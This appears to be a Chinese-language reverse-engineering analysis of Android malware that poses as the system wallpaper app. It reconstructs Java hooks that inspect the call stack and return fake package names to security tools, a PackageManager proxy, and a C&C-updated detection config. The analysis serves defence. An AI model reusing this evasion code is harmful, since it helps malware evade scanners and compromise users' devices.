# com.android.wallpaper 包名伪装机制分析

## 一、整体架构

伪装分为 **四个层次**，从静态到动态，形成完整的身份欺骗体系：

```
┌─────────────────────────────────────────────────────────────────────────┐
│  第一层：静态 Manifest 伪装                                              │
│  AndroidManifest.xml → package="com.android.wallpaper"                  │
│  系统层面认为这是一个壁纸应用                                              │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│  第二层：反射替换 Application.mBase                                      │
│  Application.mBase = new HookContextWrapper(originalContext)            │
│  所有 context 调用都经过 hook                                            │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│  第三层：动态 Hook                                                       │
│                                                                         │
│  ┌─ getPackageName() Hook ──────────────────────────────────────────┐   │
│  │  遍历调用栈 → 匹配安全工具特征 → 命中则返回随机假包名              │   │
│  └──────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─ getPackageManager() Hook ───────────────────────────────────────┐   │
│  │  遍历调用栈 → 匹配安全工具特征 → 命中则返回 PackageManagerProxy   │   │
│  │  ├── getPackageInfo(假包名) → 替换为真实包名查询                   │   │
│  │  └── getInstallerPackageName(假包名) → 替换为真实包名查询          │   │
│  └──────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│  第四层：C&C 动态更新检测模式                                             │
│  DllpgdConfig.hookPkgNameStackTraces        → 包名检测栈帧模式列表       │
│  DllpgdConfig.hookPackageManagerStackTraces  → PM 检测栈帧模式列表       │
│  DllpgdConfig.fixPackageName                → 服务端指定的替换包名       │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 二、第一层：静态 Manifest 伪装

最基础的一层 — AndroidManifest.xml 中直接声明包名为 `com.android.wallpaper`：

```xml
<!-- jadx_output/resources/AndroidManifest.xml -->
<manifest package="com.android.wallpaper"
          android:versionCode="34"
          android:versionName="14"
          android:compileSdkVersion="34"
          android:compileSdkVersionCodename="14">

    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>

    <application android:label="@string/app_name"
                 android:icon="@mipmap/ic_launcher">
        <activity android:name="com.nied.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**伪装要点：**

| 属性 | 伪装值 | 目的 |
|------|--------|------|
| `package` | `com.android.wallpaper` | 冒充 Android 系统壁纸应用 |
| `versionName` | `"14"` | 与 Android 14 版本号对齐 |
| `compileSdkVersion` | `34` | 与 Android 14 SDK 版本一致 |
| 权限 | 仅 INTERNET + NETWORK_STATE | 最小权限，不引起怀疑 |
| Activity | `com.nied.MainActivity` | 实际代码在非系统包名下 |

安装后，系统层面认为它就是一个壁纸应用。用户在设置 → 应用列表中看到的包名也是 `com.android.wallpaper`。

---

## 三、第二层：反射替换 Application.mBase

### 3.1 入口

SDK 在 `MainActivity.onCreate()` 中初始化：

```java
// com/nied/MainActivity.java
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        Kucopd.init(getApplicationContext(), "n3Hza");  // ← SDK 入口
    }
}
```

### 3.2 Context 替换

初始化过程中，通过反射将 Application 的 `mBase` 字段替换为自定义的 `HookContextWrapper`：

```java
// IlIllll1/lIIIIlllllIlll1.java (ContextHookInstaller)

public static void installHook() throws Throwable {
    // ① 获取 Application 实例
    Application application = AppContext.getApplication();
    if (application == null) {
        throw new HookException("application is null");
    }

    // ② 反射查找 ContextWrapper.mBase 字段（向上遍历继承链）
    Field mBaseField = findFieldRecursive(application.getClass(), "mBase");
    if (mBaseField == null) {
        throw new HookException("mBase field not found");
    }

    // ③ 获取原始 baseContext
    Object originalContext = mBaseField.get(application);
    if (!(originalContext instanceof Context)) {
        throw new HookException("mBase is not Context");
    }

    // ④ 用 HookContextWrapper 替换原始 Context
    mBaseField.set(application, new HookContextWrapper((Context) originalContext));

    // ⑤ 验证替换成功
    isHooked = mBaseField.get(application) instanceof HookContextWrapper;
}
```

反射字段查找支持继承链向上搜索：

```java
// 递归查找字段，兼容 Application 的各种子类
public static Field findFieldRecursive(Class cls, String fieldName) {
    Field field;
    try {
        field = cls.getDeclaredField(fieldName);
    } catch (NoSuchFieldException e) {
        field = null;
    }
    // 如果当前类没找到，递归查找父类
    if (field == null && cls.getSuperclass() != null) {
        return findFieldRecursive(cls.getSuperclass(), fieldName);
    }
    if (field != null && !field.isAccessible()) {
        field.setAccessible(true);  // 突破 private 访问限制
    }
    return field;
}
```

**替换后的效果：**

```
替换前：
Application.mBase → 原始 ContextImpl
                     └── getPackageName() → "com.android.wallpaper"
                     └── getPackageManager() → 系统 PackageManager

替换后：
Application.mBase → HookContextWrapper (extends ContextWrapper)
                     ├── getPackageName() → 拦截 + 栈帧检测
                     ├── getPackageManager() → 拦截 + 栈帧检测
                     └── 其他方法 → 透传到原始 Context
```

---

## 四、第三层：动态 Hook 实现

### 4.1 HookContextWrapper — getPackageName() Hook

```java
// IlIllll1/IllIIlIIII1.java (HookContextWrapper)

public class HookContextWrapper extends ContextWrapper {

    // PackageManager 代理实例
    public final PackageManagerProxy pmProxy;

    public HookContextWrapper(Context context) {
        super(context);
        this.pmProxy = new PackageManagerProxy(context.getPackageManager());
    }

    // ═══════════════════════════════════════════════════════════════
    // getPackageName() Hook
    // ═══════════════════════════════════════════════════════════════

    @Override
    public String getPackageName() {
        try {
            // 获取当前线程的完整调用栈
            StackTraceElement[] stackTrace = Thread.currentThread().getStackTrace();

            for (StackTraceElement frame : stackTrace) {
                // 检查栈帧是否匹配安全工具特征模式
                if (HookConfig.matchesPkgNamePattern(frame)) {

                    // 命中! 记录日志（发送到 C&C）
                    LogHelper.i(TAG,
                        "getPackageName hook triggered: "
                        + frame.getClassName() + "." + frame.getMethodName());

                    // 返回随机假包名，而非真实的 com.android.wallpaper
                    return HookConfig.fakePackageName;
                }
            }
        } catch (Exception unused) {
            // 静默忽略异常
        }
        // 没有检测到安全工具 → 返回真实包名
        return getBaseContext().getPackageName();
    }

    // ═══════════════════════════════════════════════════════════════
    // getPackageManager() Hook
    // ═══════════════════════════════════════════════════════════════

    @Override
    public PackageManager getPackageManager() {
        PackageManager realPM = getBaseContext().getPackageManager();

        // 遍历调用栈
        for (StackTraceElement frame : Thread.currentThread().getStackTrace()) {
            // 检查栈帧是否匹配 PackageManager 检测模式
            if (HookConfig.matchesPMPattern(frame)) {

                LogHelper.i(TAG,
                    "getPackageManager hook triggered: "
                    + frame.getClassName() + "." + frame.getMethodName());

                // 返回代理 PackageManager
                return this.pmProxy;
            }
        }
        return realPM;
    }

    /** 获取原始的底层 Context（跳过 ContextWrapper 链） */
    public final Context getBaseContext() {
        Context base = super.getBaseContext();
        return base instanceof ContextWrapper
            ? ((ContextWrapper) base).getBaseContext()
            : base;
    }
}
```

### 4.2 HookConfig — 栈帧匹配与假包名管理

```java
// IlIllll1/llllIIIIll1.java (HookConfig)

public class HookConfig {

    /** 默认的 PackageManager hook 检测模式（编译时内置）*/
    public static final List<String> DEFAULT_PM_PATTERNS;

    /** 当前生效的 getPackageName() 检测模式列表 */
    public static List<String> pkgNamePatterns;

    /** 当前生效的 getPackageManager() 检测模式列表 */
    public static List<String> pmPatterns;

    /** 真实包名 (com.android.wallpaper) */
    public static String realPackageName;

    /** 是否已完成初始化 */
    public static boolean initialized;

    /** 伪造的假包名（随机选取） */
    public static String fakePackageName;

    /** hook 功能是否启用 */
    public static boolean hookEnabled;

    static {
        // 默认检测模式（XOR 加密存储）
        // 解密后可能包含: "com.google.android.gms", "com.android.vending" 等
        // 这些是 Google Play Protect 等安全服务的包名/类名
        DEFAULT_PM_PATTERNS = Arrays.asList(
            decrypt(...),   // 安全工具特征 1
            decrypt(...)    // 安全工具特征 2
        );
        pkgNamePatterns = new ArrayList<>();
        pmPatterns = new ArrayList<>();
    }

    // ═══════════════════════════════════════════════════════════════
    // 初始化：保存真实包名 + 随机选取假包名
    // ═══════════════════════════════════════════════════════════════

    public static final void init(Context context) {
        // 初始化时使用默认模式
        pkgNamePatterns = DEFAULT_PM_PATTERNS;
        pmPatterns = DEFAULT_PM_PATTERNS;

        // 保存真实包名
        realPackageName = context.getPackageName();  // "com.android.wallpaper"

        // 预设的合法系统包名候选列表（约 13 个，XOR 加密存储）
        // 解密后可能是各种系统/知名应用包名，例如：
        //   com.google.android.gms
        //   com.google.android.apps.photos
        //   com.samsung.android.launcher
        //   com.android.chrome
        //   ... 等
        List<String> candidates = Arrays.asList(
            decrypt(...), decrypt(...), decrypt(...),
            decrypt(...), decrypt(...), decrypt(...),
            decrypt(...), decrypt(...), decrypt(...),
            decrypt(...), decrypt(...), decrypt(...),
            decrypt(...)
        );

        // 随机选取一个作为本次运行的假包名
        fakePackageName = candidates.get(new Random().nextInt(candidates.size()));
    }

    // ═══════════════════════════════════════════════════════════════
    // 栈帧匹配函数
    // ═══════════════════════════════════════════════════════════════

    /** 检查栈帧是否匹配 getPackageName() hook 模式 */
    public static boolean matchesPkgNamePattern(StackTraceElement frame) {
        if (frame == null || pkgNamePatterns.size() <= 0) {
            return false;
        }
        for (String pattern : pkgNamePatterns) {
            if (frame.toString().contains(pattern)) {
                return true;
            }
        }
        return false;
    }

    /** 检查栈帧是否匹配 getPackageManager() hook 模式 */
    public static boolean matchesPMPattern(StackTraceElement frame) {
        if (frame == null || pmPatterns.size() <= 0) {
            return false;
        }
        for (String pattern : pmPatterns) {
            if (frame.toString().contains(pattern)) {
                return true;
            }
        }
        return false;
    }

    /** 检查 hook 功能是否可用（已初始化 + 包名不同） */
    public static boolean isHookActive() {
        return initialized
            && !TextUtils.isEmpty(realPackageName)
            && !TextUtils.isEmpty(fakePackageName)
            && !realPackageName.equals(fakePackageName);
    }
}
```

### 4.3 PackageManagerProxy — 透明代理

```java
// IlIllll1/llllIllIl1.java (PackageManagerProxy)
// 继承 PackageManager，包装所有方法

public class PackageManagerProxy extends PackageManager {

    /** 原始的系统 PackageManager */
    public PackageManager realPM;

    /** 假包名（随机选取的系统应用包名） */
    public final String fakePackageName = HookConfig.fakePackageName;

    /** 真实包名 (com.android.wallpaper) */
    public final String realPackageName = HookConfig.realPackageName;

    public PackageManagerProxy(PackageManager packageManager) {
        this.realPM = packageManager;
    }

    // ═══════════════════════════════════════════════════════════════
    // 关键拦截方法
    // ═══════════════════════════════════════════════════════════════

    /**
     * getPackageInfo() — 包名替换
     *
     * 当安全工具使用 getPackageName() 拿到假包名后，
     * 可能会用这个假包名去查 PackageInfo。
     * 这里将假包名替换回真实包名，确保查询能返回有效结果。
     */
    @Override
    public PackageInfo getPackageInfo(String str, int i)
            throws NameNotFoundException {
        if (str != null && str.equals(this.fakePackageName)) {
            str = this.realPackageName;  // 假包名 → 真实包名
        }
        return this.realPM.getPackageInfo(str, i);
    }

    /**
     * getInstallerPackageName() — 包名替换
     *
     * 同理，查询安装来源时也做包名替换。
     */
    @Override
    public String getInstallerPackageName(String str) {
        if (str != null && str.equals(this.fakePackageName)) {
            str = this.realPackageName;
        }
        return this.realPM.getInstallerPackageName(str);
    }

    // ═══════════════════════════════════════════════════════════════
    // 其他所有方法：直接透传到真实 PackageManager
    // ═══════════════════════════════════════════════════════════════

    @Override
    public List<PackageInfo> getInstalledPackages(int i) {
        return this.realPM.getInstalledPackages(i);
    }

    @Override
    public List<ApplicationInfo> getInstalledApplications(int i) {
        return this.realPM.getInstalledApplications(i);
    }

    @Override
    public ApplicationInfo getApplicationInfo(String str, int i)
            throws NameNotFoundException {
        return this.realPM.getApplicationInfo(str, i);
    }

    // ... 其余 40+ 个 PackageManager 方法全部透传 ...
}
```

---

## 五、第四层：C&C 动态更新检测模式

### 5.1 DllpgdConfig 配置结构

检测模式不仅有编译时内置的默认列表，还可以通过 C&C 服务器 **动态下发更新**：

```java
// c13/nim5/ez8/h5_proto/DllpgdConfig.java
public class DllpgdConfig {
    private List<PluginInfo> plugins;              // 远程插件列表
    private String sessionId;                       // 会话 ID
    private List<String> hookPkgNameStackTraces;    // getPackageName() 检测模式
    private List<String> hookPackageManagerStackTraces; // getPackageManager() 检测模式
    private String fixPackageName;                  // 服务端指定的替换包名
}
```

### 5.2 配置下发流程

```
C&C 服务器 (POST /api/v1/dllpgd/getConfig)
    ↓ JSON 响应
GetConfigResponse
    ├── code: 0
    ├── message: "ok"
    └── dllpgdConfig:
        ├── plugins: [...]
        ├── sessionId: "xxx"
        ├── hookPkgNameStackTraces: [
        │     "com.some.security.tool.ClassName",
        │     "com.another.antivirus.Scanner"
        │   ]
        ├── hookPackageManagerStackTraces: [
        │     "com.google.android.gms.security",
        │     "com.play.protect.verifier"
        │   ]
        └── fixPackageName: "com.android.providers.settings"
```

### 5.3 动态更新的意义

| 字段 | 作用 | 为什么需要动态更新 |
|------|------|-------------------|
| `hookPkgNameStackTraces` | 新增安全工具的栈帧特征 | 安全工具会更新版本，类名/方法名可能变化 |
| `hookPackageManagerStackTraces` | 新增 PM 查询工具的特征 | Google Play Protect 等持续更新检测逻辑 |
| `fixPackageName` | 服务端可指定特定的替换包名 | 某些假包名可能被标记，需要换新的 |

---

## 六、完整执行流程

```
用户安装 APK (com.android.wallpaper)
  ↓
系统认为这是壁纸应用 → 显示在已安装应用列表中
  ↓
MainActivity.onCreate()
  ↓ Kucopd.init(context, "n3Hza")
  ↓
SDK 初始化
  ├── ① HookConfig.init(context)
  │     ├── 保存真实包名 "com.android.wallpaper"
  │     ├── 加载默认检测模式（内置2个）
  │     └── 从13个候选中随机选取假包名
  │
  ├── ② ContextHookInstaller.installHook()
  │     ├── 反射获取 Application.mBase
  │     ├── mBase = new HookContextWrapper(originalContext)
  │     └── 验证替换成功
  │
  └── ③ 从 C&C 获取 DllpgdConfig（异步）
        ├── 更新 hookPkgNameStackTraces
        ├── 更新 hookPackageManagerStackTraces
        └── 更新 fixPackageName（如果有）

运行时：
  ↓
某处代码调用 context.getPackageName()
  ↓ 实际执行的是 HookContextWrapper.getPackageName()
  ↓
遍历调用栈 Thread.currentThread().getStackTrace()
  ├── 栈帧匹配安全工具特征?
  │     ├── YES → 返回假包名 (如 "com.google.android.apps.photos")
  │     │         日志上报 C&C："hook triggered: xxx.yyy"
  │     └── NO  → 返回真实包名 "com.android.wallpaper"
  ↓
某处代码调用 context.getPackageManager()
  ↓ 实际执行的是 HookContextWrapper.getPackageManager()
  ↓
遍历调用栈
  ├── 栈帧匹配?
  │     ├── YES → 返回 PackageManagerProxy
  │     │         ├── getPackageInfo(假包名) → 替换为真实包名查询
  │     │         └── getInstallerPackageName(假包名) → 替换为真实包名查询
  │     └── NO  → 返回原始 PackageManager
```

---

## 七、反检测逻辑分析

### 7.1 为什么需要两层检测

```
场景1：安全工具直接调用 getPackageName()
  → HookContextWrapper.getPackageName() 拦截
  → 返回假包名 "com.google.android.apps.photos"
  → 安全工具认为这是 Google Photos，跳过检查 ✓

场景2：安全工具通过 PackageManager.getPackageInfo() 查询
  → HookContextWrapper.getPackageManager() 拦截
  → 返回 PackageManagerProxy
  → proxy.getPackageInfo("com.google.android.apps.photos")
  → 内部替换为 getPackageInfo("com.android.wallpaper")
  → 返回真实的 PackageInfo（签名、权限等正确）✓
```

### 7.2 为什么 PackageManagerProxy 需要做包名反替换

如果安全工具拿到假包名 `com.google.android.apps.photos` 后去查 `getPackageInfo()`，
用假包名查的话会因为 Google Photos 未安装而抛出 `NameNotFoundException`。
所以 Proxy 把假包名替换回真实包名查询，确保返回有效结果，不暴露破绽。

### 7.3 随机选取的目的

每次 SDK 初始化都从 13 个候选中随机选取假包名：
- 防止安全公司通过固定的假包名建立检测规则
- 不同设备上使用不同的假包名，增加关联分析的难度

---

## 八、关键源码索引

| 还原名称 | JADX 混淆名 | 文件位置 | 功能 |
|---------|------------|---------|------|
| HookContextWrapper | `IlIllll1.IllIIlIIII1` | `jadx_output/sources/IlIllll1/IllIIlIIII1.java` | ContextWrapper 子类，hook getPackageName() + getPackageManager() |
| HookConfig | `IlIllll1.llllIIIIll1` | `jadx_output/sources/IlIllll1/llllIIIIll1.java` | 栈帧匹配逻辑、假包名管理、候选列表 |
| ContextHookInstaller | `IlIllll1.lIIIIlllllIlll1` | `jadx_output/sources/IlIllll1/lIIIIlllllIlll1.java` | 反射替换 Application.mBase |
| PackageManagerProxy | `IlIllll1.llllIllIl1` | `jadx_output/sources/IlIllll1/llllIllIl1.java` | PackageManager 代理，拦截 getPackageInfo/getInstallerPackageName |
| DllpgdConfig | `c13.nim5.ez8.h5_proto.DllpgdConfig` | `restored_java/c2/DllpgdConfig.java` | C&C 下发的配置，含动态更新的检测模式列表 |
| GetConfigResponse | `c13.nim5.ez8.h5_proto.GetConfigResponse` | `restored_java/c2/GetConfigResponse.java` | /api/v1/dllpgd/getConfig 响应包装 |
| MainActivity | `com.nied.MainActivity` | `jadx_output/sources/com/nied/MainActivity.java` | SDK 入口：`Kucopd.init(context, "n3Hza")` |
| AndroidManifest.xml | — | `jadx_output/resources/AndroidManifest.xml` | 静态包名声明 `com.android.wallpaper` |

---

## 九、总结

这套包名伪装机制的设计意图是 **反分析的反分析**：

1. **第一重伪装**：`com.android.wallpaper` — 让用户和基础安全扫描认为这是系统壁纸应用
2. **第二重伪装**：当安全工具深入检查时，通过栈帧检测识别安全工具的存在，返回一个随机的合法系统应用包名，进一步混淆身份
3. **动态更新**：C&C 服务器可以随时更新检测模式和假包名，应对安全工具的版本迭代

本质上，这不仅仅是"把包名改成系统应用"这么简单，而是一个完整的 **运行时身份欺骗系统**，能够根据调用者身份动态切换返回的包名，确保在任何检测场景下都不暴露真实身份。
